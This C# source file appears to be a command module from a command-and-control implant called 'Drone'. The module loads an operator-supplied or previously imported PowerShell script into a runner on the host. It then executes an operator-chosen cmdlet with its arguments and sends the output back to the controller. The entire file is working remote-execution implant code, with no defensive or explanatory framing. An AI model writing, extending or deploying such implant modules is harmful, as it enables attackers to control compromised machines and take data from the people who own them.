﻿using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class PowerShell : DroneCommand
{
    public override byte Command => 0x3D;
    public override bool Threaded => true;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        using var runner = new PowerShellRunner();

        string script = null;
        
        if (task.Artefact is not null && task.Artefact.Length > 0)
        {
            script = Encoding.ASCII.GetString(task.Artefact);
        }
        else if(!string.IsNullOrWhiteSpace(PowerShellImport.ImportedScript))
        {
            script = PowerShellImport.ImportedScript;
        }

        if (!string.IsNullOrWhiteSpace(script))
        {
            if (script.StartsWith("?"))
                script = script.Remove(0, 3);
            
            runner.ImportScript(script);
        }

        var command = task.Arguments["cmdlet"];

        if (task.Arguments.TryGetValue("args", out var args))
            command += $" {args}";

        var result = runner.Invoke(command);
        await Drone.SendTaskOutput(task.Id, result);
    }
}